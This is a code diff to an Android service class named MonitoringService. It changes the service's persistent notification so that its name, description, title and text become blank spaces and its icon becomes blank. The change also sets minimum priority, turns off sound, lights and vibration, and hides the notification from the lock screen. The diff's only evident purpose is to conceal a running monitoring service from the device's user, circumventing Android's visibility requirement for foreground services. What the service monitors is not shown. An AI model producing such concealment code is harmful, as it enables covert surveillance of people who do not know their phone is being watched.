@@ -168,21 +168,28 @@ class MonitoringService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "Sistem Servisi",
-                NotificationManager.IMPORTANCE_LOW
+                " ",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Arka plan servisi"
+                description = " "
                 setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle(getString(R.string.service_notification_title))
-            .setContentText(getString(R.string.service_notification_text))
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
+            .setContentTitle(" ")
+            .setContentText(" ")
+            .setSmallIcon(R.drawable.ic_notification_blank)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
             .build()
     }
 
